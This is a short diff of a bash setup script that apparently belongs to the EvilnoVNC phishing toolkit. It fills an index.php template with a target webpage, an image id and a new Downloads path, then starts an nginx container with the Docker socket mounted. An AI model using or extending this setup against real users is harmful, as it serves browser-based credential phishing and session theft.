@@ -16,13 +16,14 @@ fi ; exit 0 ; fi
 # Variables
 WEBPAGE=$1
 
-
+path=$(pwd)
 echo "Preparando nginx..."
 cd Files
 cp index.php index_tmp.php
 id_image=$(sudo docker images | grep evilnovnc | cut -d" " -f 9)
 sed -i'' -e "s,webpage,$WEBPAGE,g" index_tmp.php
 sed -i'' -e "s/idimage/$id_image/g" index_tmp.php
+sed -i'' -e "s,download_string,$path/Downloads,g" index_tmp.php
 cd ..
 sudo docker network create nginx-evil 2> /dev/null
 sudo docker run --name evilnginx  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:8080 -d nginx
